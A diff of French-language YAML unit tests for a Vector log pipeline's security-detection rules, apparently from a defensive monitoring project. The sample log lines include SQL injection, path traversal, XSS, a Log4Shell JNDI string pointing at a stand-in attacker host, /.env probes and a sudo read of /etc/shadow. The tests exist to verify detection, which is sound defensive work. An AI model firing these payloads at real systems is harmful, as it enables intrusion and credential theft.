@@ -1,77 +1,176 @@
-# Tests unitaires des transformations Vector.
+# Tests unitaires du pipeline Vector : une ligne de log réaliste par règle.
 # Lancement : ./scripts/test-vector.sh
 tests:
-  - name: "SSH - échec de mot de passe détecté"
+  - name: "SSH - échec d'authentification"
     inputs:
-      - insert_at: security_detect
+      - insert_at: syslog_normalize
         type: log
         log_fields:
-          message: "Failed password for invalid user admin from 203.0.113.7 port 52344 ssh2"
-          process.name: "sshd"
+          message: "<38>Nov 16 09:59:32 srv-web-01 sshd[4242]: Failed password for invalid user admin from 203.0.113.7 port 52344 ssh2"
+          host: "172.18.0.1"
     outputs:
       - extract_from: security_detect
         conditions:
           - type: vrl
             source: |
-              assert_eq!(.event.outcome, "failure")
-              assert_eq!(.event.action, "ssh_login")
-              assert_eq!(.user.name, "admin")
-              assert_eq!(.source.ip, "203.0.113.7")
-              assert_eq!(.event.kind, "alert")
+              assert!(.rule.id == "ssh_auth_failure", "attendu : .rule.id == \"ssh_auth_failure\"")
+              assert!(.event.outcome == "failure", "attendu : .event.outcome == \"failure\"")
+              assert!(.user.name == "admin", "attendu : .user.name == \"admin\"")
+              assert!(.source.ip == "203.0.113.7", "attendu : .source.ip == \"203.0.113.7\"")
+              assert!(.event.kind == "alert", "attendu : .event.kind == \"alert\"")
+              assert!(.rule.severity == "low", "attendu : .rule.severity == \"low\"")
+              assert!(.threat.technique.id == "T1110", "attendu : .threat.technique.id == \"T1110\"")
+              assert!(.rule.score == 2, "attendu : .rule.score == 2")
 
   - name: "SSH - connexion réussie (pas d'alerte)"
     inputs:
-      - insert_at: security_detect
+      - insert_at: syslog_normalize
         type: log
         log_fields:
-          message: "Accepted publickey for euloge from 192.168.1.20 port 50022 ssh2"
-          process.name: "sshd"
+          message: "<38>Nov 16 09:59:32 srv-web-01 sshd[4242]: Accepted publickey for euloge from 192.168.1.20 port 50022 ssh2"
+          host: "172.18.0.1"
     outputs:
       - extract_from: security_detect
         conditions:
           - type: vrl
             source: |
-              assert_eq!(.event.outcome, "success")
-              assert_eq!(.user.name, "euloge")
-              assert_eq!(.auth.method, "publickey")
-              assert_eq!(.event.kind, "event")
+              assert!(.event.outcome == "success", "attendu : .event.outcome == \"success\"")
+              assert!(.user.name == "euloge", "attendu : .user.name == \"euloge\"")
+              assert!(.auth.method == "publickey", "attendu : .auth.method == \"publickey\"")
+              assert!(.event.kind == "event", "attendu : .event.kind == \"event\"")
+              assert!(!exists(.rule), "attendu : !exists(.rule)")
+
+  - name: "SSH - connexion directe en root"
+    inputs:
+      - insert_at: syslog_normalize
+        type: log
+        log_fields:
+          message: "<38>Nov 16 09:59:32 srv-web-01 sshd[4242]: Accepted password for root from 198.51.100.4 port 50022 ssh2"
+          host: "172.18.0.1"
+    outputs:
+      - extract_from: security_detect
+        conditions:
+          - type: vrl
+            source: |
+              assert!(.rule.id == "ssh_root_login", "attendu : .rule.id == \"ssh_root_login\"")
+              assert!(.event.kind == "alert", "attendu : .event.kind == \"alert\"")
+
+  - name: "SSH - utilisateur inexistant"
+    inputs:
+      - insert_at: syslog_normalize
+        type: log
+        log_fields:
+          message: "<38>Nov 16 09:59:32 srv-web-01 sshd[4242]: Invalid user oracle from 203.0.113.7 port 50999"
+          host: "172.18.0.1"
+    outputs:
+      - extract_from: security_detect
+        conditions:
+          - type: vrl
+            source: |
+              assert!(.rule.id == "ssh_invalid_user", "attendu : .rule.id == \"ssh_invalid_user\"")
+              assert!(.user.name == "oracle", "attendu : .user.name == \"oracle\"")
+              assert!(.source.ip == "203.0.113.7", "attendu : .source.ip == \"203.0.113.7\"")
+
+  - name: "SSH - adresse non IP conservée dans source.address"
+    inputs:
+      - insert_at: syslog_normalize
+        type: log
+        log_fields:
+          message: "<38>Nov 16 09:59:32 srv-web-01 sshd[4242]: Failed password for bob from attaquant.example.org port 22 ssh2"
+          host: "172.18.0.1"
+    outputs:
+      - extract_from: security_detect
+        conditions:
+          - type: vrl
+            source: |
+              assert!(.source.address == "attaquant.example.org", "attendu : .source.address == \"attaquant.example.org\"")
+              assert!(!exists(.source.ip), "attendu : !exists(.source.ip)")
+              assert!(.rule.id == "ssh_auth_failure", "attendu : .rule.id == \"ssh_auth_failure\"")
 
   - name: "sudo vers root"
     inputs:
-      - insert_at: security_detect
+      - insert_at: syslog_normalize
         type: log
         log_fields:
-          message: "  bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow"
-          process.name: "sudo"
+          message: "<85>Nov 16 09:59:32 srv-web-01 sudo:   bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow"
+          host: "172.18.0.1"
     outputs:
       - extract_from: security_detect
         conditions:
           - type: vrl
             source: |
-              assert_eq!(.event.action, "sudo")
-              assert_eq!(.user.name, "bob")
-              assert_eq!(.user.target.name, "root")
-              assert_eq!(.process.command_line, "/usr/bin/cat /etc/shadow")
-              assert_eq!(.event.kind, "alert")
+              assert!(.rule.id == "sudo_root", "attendu : .rule.id == \"sudo_root\"")
+              assert!(.user.name == "bob", "attendu : .user.name == \"bob\"")
+              assert!(.user.target.name == "root", "attendu : .user.target.name == \"root\"")
+              assert!(.process.command_line == "/usr/bin/cat /etc/shadow", "attendu : .process.command_line == \"/usr/bin/cat /etc/shadow\"")
+              assert!(.event.outcome == "success", "attendu : .event.outcome == \"success\"")
 
-  - name: "Docker - niveau d'erreur et JSON"
+  - name: "sudo refusé"
     inputs:
-      - insert_at: docker_normalize
+      - insert_at: syslog_normalize
         type: log
         log_fields:
-          message: '{"level":"error","msg":"connexion refusée"}'
-          container_name: "api"
-          host: "abc123"
+          message: "<85>Nov 16 09:59:32 srv-web-01 sudo:   mallory : user NOT in sudoers ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash"
+          host: "172.18.0.1"
     outputs:
-      - extract_from: docker_normalize
+      - extract_from: security_detect
         conditions:
           - type: vrl
             source: |
-              assert_eq!(.log.level, "error")
-              assert_eq!(.json.msg, "connexion refusée")
-              assert_eq!(.container.name, "api")
-              assert_eq!(.event.dataset, "docker")
-              assert!(exists(."@timestamp"))
+              assert!(.rule.id == "sudo_denied", "attendu : .rule.id == \"sudo_denied\"")
+              assert!(.event.outcome == "failure", "attendu : .event.outcome == \"failure\"")
+              assert!(.user.name == "mallory", "attendu : .user.name == \"mallory\"")
+
+  - name: "Création de compte"
+    inputs:
+      - insert_at: syslog_normalize
+        type: log
+        log_fields:
+          message: "<86>Nov 16 09:59:32 srv-web-01 useradd[911]: new user: name=backdoor, UID=1001, GID=1001, home=/home/backdoor, shell=/bin/bash"
+          host: "172.18.0.1"
+    outputs:
+      - extract_from: security_detect
+        conditions:
+          - type: vrl
+            source: |
+              assert!(.rule.id == "user_created", "attendu : .rule.id == \"user_created\"")
+              assert!(.user.target.name == "backdoor", "attendu : .user.target.name == \"backdoor\"")
+              assert!(.threat.technique.id == "T1136.001", "attendu : .threat.technique.id == \"T1136.001\"")
+
+  - name: "Ajout au groupe sudo"
+    inputs:
+      - insert_at: syslog_normalize
+        type: log
+        log_fields:
+          message: "<86>Nov 16 09:59:32 srv-web-01 usermod[912]: add 'backdoor' to group 'sudo'"
+          host: "172.18.0.1"
+    outputs:
+      - extract_from: security_detect
+        conditions:
+          - type: vrl
+            source: |
+              assert!(.rule.id == "admin_group_added", "attendu : .rule.id == \"admin_group_added\"")
+              assert!(.group.name == "sudo", "attendu : .group.name == \"sudo\"")
+              assert!(.rule.severity == "high", "attendu : .rule.severity == \"high\"")
+
+  - name: "Pare-feu UFW - blocage"
+    inputs:
+      - insert_at: syslog_normalize
+        type: log
+        log_fields:
+          message: "<4>Nov 16 09:59:32 srv-web-01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=aa:bb SRC=203.0.113.50 DST=10.0.0.5 LEN=44 TTL=240 PROTO=TCP SPT=44321 DPT=3389 WINDOW=1024 SYN"
+          host: "172.18.0.1"
+    outputs:
+      - extract_from: security_detect
+        conditions:
+          - type: vrl
+            source: |
+              assert!(.event.action == "firewall_block", "attendu : .event.action == \"firewall_block\"")
+              assert!(.source.ip == "203.0.113.50", "attendu : .source.ip == \"203.0.113.50\"")
+              assert!(.destination.ip == "10.0.0.5", "attendu : .destination.ip == \"10.0.0.5\"")
+              assert!(.destination.port == 3389, "attendu : .destination.port == 3389")
+              assert!(.network.transport == "tcp", "attendu : .network.transport == \"tcp\"")
+              assert!(.event.kind == "event", "attendu : .event.kind == \"event\"")
 
   - name: "Syslog RFC 3164 - fuseau horaire et champs"
     inputs:
@@ -85,14 +184,205 @@ tests:
         conditions:
           - type: vrl
             source: |
-              # Europe/Paris (UTC+1 en novembre) → 08:59:32 UTC
-              assert_eq!(format_timestamp!(."@timestamp", "%H:%M:%S"), "08:59:32")
-              assert_eq!(.host.name, "srv-web-01")
-              assert_eq!(.host.ip, "172.18.0.1")
-              assert_eq!(.process.name, "sshd")
-              assert_eq!(.log.level, "info")
-              assert_eq!(.user.name, "root")
-              assert_eq!(.event.outcome, "failure")
+              assert!(format_timestamp!(."@timestamp", "%H:%M:%S") == "08:59:32", "attendu : format_timestamp!(.\"@timestamp\", \"%H:%M:%S\") == \"08:59:32\"")
+              assert!(.host.name == "srv-web-01", "attendu : .host.name == \"srv-web-01\"")
+              assert!(.host.ip == "172.18.0.1", "attendu : .host.ip == \"172.18.0.1\"")
+              assert!(.process.name == "sshd", "attendu : .process.name == \"sshd\"")
+              assert!(.log.level == "info", "attendu : .log.level == \"info\"")
+
+  - name: "Web - requête normale (pas d'alerte)"
+    inputs:
+      - insert_at: docker_normalize
+        type: log
+        log_fields:
+          message: "192.0.2.10 - - [16/Nov/2026:10:00:00 +0100] \"GET /index.html HTTP/1.1\" 200 612 \"-\" \"Mozilla/5.0\""
+          container_name: "nginx"
+          host: "abc123"
+    outputs:
+      - extract_from: security_detect
+        conditions:
+          - type: vrl
+            source: |
+              assert!(.event.dataset == "web", "attendu : .event.dataset == \"web\"")
+              assert!(.event.origin == "docker", "attendu : .event.origin == \"docker\"")
+              assert!(.source.ip == "192.0.2.10", "attendu : .source.ip == \"192.0.2.10\"")
+              assert!(.http.response.status_code == 200, "attendu : .http.response.status_code == 200")
+              assert!(.http.request.method == "GET", "attendu : .http.request.method == \"GET\"")
+              assert!(.url.original == "/index.html", "attendu : .url.original == \"/index.html\"")
+              assert!(.event.kind == "event", "attendu : .event.kind == \"event\"")
+              assert!(.container.name == "nginx", "attendu : .container.name == \"nginx\"")
+
+  - name: "Web - injection SQL (URL encodée)"
+    inputs:
+      - insert_at: docker_normalize
+        type: log
+        log_fields:
+          message: "192.0.2.66 - - [16/Nov/2026:10:00:00 +0100] \"GET /produits?id=1%27%20UNION%20SELECT%20login,pass%20FROM%20users-- HTTP/1.1\" 200 5120 \"-\" \"Mozilla/5.0\""
+          container_name: "nginx"
+          host: "abc123"
+    outputs:
+      - extract_from: security_detect
+        conditions:
+          - type: vrl
+            source: |
+              assert!(.rule.id == "web_sqli", "attendu : .rule.id == \"web_sqli\"")
+              assert!(.event.action == "web_attack", "attendu : .event.action == \"web_attack\"")
+              assert!(.rule.severity == "high", "attendu : .rule.severity == \"high\"")
+              assert!(.threat.technique.id == "T1190", "attendu : .threat.technique.id == \"T1190\"")
+
+  - name: "Web - traversée de répertoire"
+    inputs:
+      - insert_at: docker_normalize
+        type: log
+        log_fields:
+          message: "192.0.2.66 - - [16/Nov/2026:10:00:00 +0100] \"GET /download?f=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\" 404 153 \"-\" \"curl/8.4\""
+          container_name: "nginx"
+          host: "abc123"
+    outputs:
+      - extract_from: security_detect
+        conditions:
+          - type: vrl
+            source: |
+              assert!(.rule.id == "web_traversal", "attendu : .rule.id == \"web_traversal\"")
+              assert!(.event.outcome == "failure", "attendu : .event.outcome == \"failure\"")
+
+  - name: "Web - XSS"
+    inputs:
+      - insert_at: docker_normalize
+        type: log
+        log_fields:
+          message: "192.0.2.66 - - [16/Nov/2026:10:00:00 +0100] \"GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\" 200 800 \"-\" \"Mozilla/5.0\""
+          container_name: "nginx"
+          host: "abc123"
+    outputs:
+      - extract_from: security_detect
+        conditions:
+          - type: vrl
+            source: |
+              assert!(.rule.id == "web_xss", "attendu : .rule.id == \"web_xss\"")
+
+  - name: "Web - injection de commande (Log4Shell)"
+    inputs:
+      - insert_at: docker_normalize
+        type: log
+        log_fields:
+          message: "192.0.2.66 - - [16/Nov/2026:10:00:00 +0100] \"GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1\" 200 800 \"-\" \"Mozilla/5.0\""
+          container_name: "nginx"
+          host: "abc123"
+    outputs:
+      - extract_from: security_detect
+        conditions:
+          - type: vrl
+            source: |
+              assert!(.rule.id == "web_cmd_injection", "attendu : .rule.id == \"web_cmd_injection\"")
+
+  - name: "Web - ressource sensible"
+    inputs:
+      - insert_at: docker_normalize
+        type: log
+        log_fields:
+          message: "192.0.2.66 - - [16/Nov/2026:10:00:00 +0100] \"GET /.env HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.0\""
+          container_name: "nginx"
+          host: "abc123"
+    outputs:
+      - extract_from: security_detect
+        conditions:
+          - type: vrl
+            source: |
+              assert!(.rule.id == "web_sensitive_file", "attendu : .rule.id == \"web_sensitive_file\"")
+              assert!(.event.action == "web_scan", "attendu : .event.action == \"web_scan\"")
+
+  - name: "Web - scanner"
+    inputs:
+      - insert_at: docker_normalize
+        type: log
+        log_fields:
+          message: "192.0.2.66 - - [16/Nov/2026:10:00:00 +0100] \"GET /login HTTP/1.1\" 200 153 \"-\" \"sqlmap/1.8#stable (https://sqlmap.org)\""
+          container_name: "nginx"
+          host: "abc123"
+    outputs:
+      - extract_from: security_detect
+        conditions:
+          - type: vrl
+            source: |
+              assert!(.rule.id == "web_scanner", "attendu : .rule.id == \"web_scanner\"")
+              assert!(.threat.technique.id == "T1595.002", "attendu : .threat.technique.id == \"T1595.002\"")
+
+  - name: "Web - accès nginx reçu par syslog"
+    inputs:
+      - insert_at: syslog_normalize
+        type: log
+        log_fields:
+          message: "<190>Nov 16 09:59:32 srv-web-01 nginx: 192.0.2.66 - - [16/Nov/2026:10:00:00 +0100] \"GET /wp-login.php HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.0\""
+          host: "172.18.0.1"
+    outputs:
+      - extract_from: security_detect
+        conditions:
+          - type: vrl
+            source: |
+              assert!(.event.dataset == "web", "attendu : .event.dataset == \"web\"")
+              assert!(.event.origin == "syslog", "attendu : .event.origin == \"syslog\"")
+              assert!(.rule.id == "web_sensitive_file", "attendu : .rule.id == \"web_sensitive_file\"")
+              assert!(.host.name == "srv-web-01", "attendu : .host.name == \"srv-web-01\"")
+
+  - name: "Pot de miel - contact"
+    inputs:
+      - insert_at: docker_normalize
+        type: log
+        log_fields:
+          message: "{\"honeypot\": true, \"service\": \"http\", \"event\": \"http_request\", \"src_ip\": \"198.51.100.77\", \"port\": 8080, \"method\": \"GET\", \"path\": \"/admin\", \"user_agent\": \"zgrab/0.x\", \"summary\": \"GET /admin depuis 198.51.100.77\"}"
+          container_name: "honeypot"
+          host: "abc123"
+    outputs:
+      - extract_from: security_detect
+        conditions:
+          - type: vrl
+            source: |
+              assert!(.event.dataset == "honeypot", "attendu : .event.dataset == \"honeypot\"")
+              assert!(.rule.id == "honeypot_contact", "attendu : .rule.id == \"honeypot_contact\"")
+              assert!(.source.ip == "198.51.100.77", "attendu : .source.ip == \"198.51.100.77\"")
+              assert!(.destination.port == 8080, "attendu : .destination.port == 8080")
+              assert!(.url.original == "/admin", "attendu : .url.original == \"/admin\"")
+              assert!(.message == "GET /admin depuis 198.51.100.77", "attendu : .message == \"GET /admin depuis 198.51.100.77\"")
+              assert!(!exists(.json), "attendu : !exists(.json)")
+
+  - name: "Pot de miel - tentative de connexion"
+    inputs:
+      - insert_at: docker_normalize
+        type: log
+        log_fields:
+          message: "{\"honeypot\": true, \"service\": \"http\", \"event\": \"login_attempt\", \"src_ip\": \"198.51.100.77\", \"port\": 8080, \"method\": \"POST\", \"path\": \"/login\", \"username\": \"admin\", \"summary\": \"Tentative de connexion admin\"}"
+          container_name: "honeypot"
+          host: "abc123"
+    outputs:
+      - extract_from: security_detect
+        conditions:
+          - type: vrl
+            source: |
+              assert!(.rule.id == "honeypot_login", "attendu : .rule.id == \"honeypot_login\"")
+              assert!(.user.name == "admin", "attendu : .user.name == \"admin\"")
+              assert!(.rule.score == 15, "attendu : .rule.score == 15")
+              assert!(.event.action == "login_attempt", "attendu : .event.action == \"login_attempt\"")
+
+  - name: "Docker - niveau d'erreur et JSON"
+    inputs:
+      - insert_at: docker_normalize
+        type: log
+        log_fields:
+          message: "{\"level\":\"error\",\"msg\":\"connexion refusée\"}"
+          container_name: "api"
+          host: "abc123"
+    outputs:
+      - extract_from: security_detect
+        conditions:
+          - type: vrl
+            source: |
+              assert!(.log.level == "error", "attendu : .log.level == \"error\"")
+              assert!(.json.msg == "connexion refusée", "attendu : .json.msg == \"connexion refusée\"")
+              assert!(.container.name == "api", "attendu : .container.name == \"api\"")
+              assert!(.event.dataset == "docker", "attendu : .event.dataset == \"docker\"")
+              assert!(exists(."@timestamp"), "attendu : exists(.\"@timestamp\")")
+              assert!(.event.kind == "event", "attendu : .event.kind == \"event\"")
 
   - name: "Syslog non conforme conservé"
     inputs:
@@ -106,3 +396,72 @@ tests:
           - type: vrl
             source: |
               assert_eq!(.tags, ["_syslog_parse_failure"])
+
+  - name: "sudo - échec authentification PAM"
+    inputs:
+      - insert_at: syslog_normalize
+        type: log
+        log_fields:
+          message: "<85>Nov 16 09:59:32 srv-web-01 sudo:   charlie : 3 incorrect password attempts ; TTY=pts/2 ; PWD=/home/charlie ; USER=root ; COMMAND=/bin/sh"
+          host: "172.18.0.1"
+    outputs:
+      - extract_from: security_detect
+        conditions:
+          - type: vrl
+            source: |
+              assert!(.rule.id == "sudo_denied", "attendu : .rule.id == \"sudo_denied\"")
+              assert!(.event.outcome == "failure", "attendu : .event.outcome == \"failure\"")
+              assert!(.user.name == "charlie", "attendu : .user.name == \"charlie\"")
+              assert!(.event.kind == "alert", "attendu : .event.kind == \"alert\"")
+
+  - name: "sudo vers non-root (pas d'alerte)"
+    inputs:
+      - insert_at: syslog_normalize
+        type: log
+        log_fields:
+          message: "<85>Nov 16 09:59:32 srv-web-01 sudo:   alice : TTY=pts/3 ; PWD=/home/alice ; USER=www-data ; COMMAND=/usr/bin/whoami"
+          host: "172.18.0.1"
+    outputs:
+      - extract_from: security_detect
+        conditions:
+          - type: vrl
+            source: |
+              assert!(.event.action == "sudo", "attendu : .event.action == \"sudo\"")
+              assert!(.event.outcome == "success", "attendu : .event.outcome == \"success\"")
+              assert!(.user.name == "alice", "attendu : .user.name == \"alice\"")
+              assert!(.user.target.name == "www-data", "attendu : .user.target.name == \"www-data\"")
+              assert!(.event.kind == "event", "attendu : .event.kind == \"event\"")
+              assert!(!exists(.rule), "attendu : pas de règle root déclenchée")
+
+  - name: "Syslog avec procid alphanumérique (procid type safety)"
+    inputs:
+      - insert_at: syslog_normalize
+        type: log
+        log_fields:
+          message: "<14>1 2026-11-16T10:00:00Z srv-app mydaemon init - - message de démarrage"
+          host: "172.18.0.1"
+    outputs:
+      - extract_from: syslog_normalize
+        conditions:
+          - type: vrl
+            source: |
+              assert!(.process.name == "mydaemon", "attendu : .process.name == \"mydaemon\"")
+              assert!(!exists(.process.pid), "attendu : pid alphanumérique non affecté à process.pid")
+              assert!(.event.dataset == "syslog", "attendu : .event.dataset == \"syslog\"")
+
+  - name: "SSH - IP malformée non insérée dans source.ip"
+    inputs:
+      - insert_at: syslog_normalize
+        type: log
+        log_fields:
+          message: "<38>Nov 16 09:59:32 srv-web-01 sshd[4242]: Failed password for root from 1.2.3.4. port 22 ssh2"
+          host: "172.18.0.1"
+    outputs:
+      - extract_from: security_detect
+        conditions:
+          - type: vrl
+            source: |
+              assert!(.event.action == "ssh_login", "attendu : .event.action == \"ssh_login\"")
+              assert!(.event.outcome == "failure", "attendu : .event.outcome == \"failure\"")
+              assert!(.source.address == "1.2.3.4.", "attendu : adresse brute dans source.address")
+              assert!(!exists(.source.ip), "attendu : IP malformée non injectée dans source.ip")
